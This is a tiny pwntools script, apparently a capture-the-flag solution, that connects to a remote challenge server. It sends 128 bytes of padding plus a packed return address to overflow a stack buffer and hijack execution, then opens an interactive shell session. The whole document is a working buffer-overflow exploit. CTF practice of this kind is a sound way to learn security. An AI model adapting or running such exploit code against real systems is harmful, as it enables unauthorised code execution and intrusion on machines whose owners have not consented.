from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3001)

r.sendline(b"a"*128+p32(0x0804849b))

r.interactive()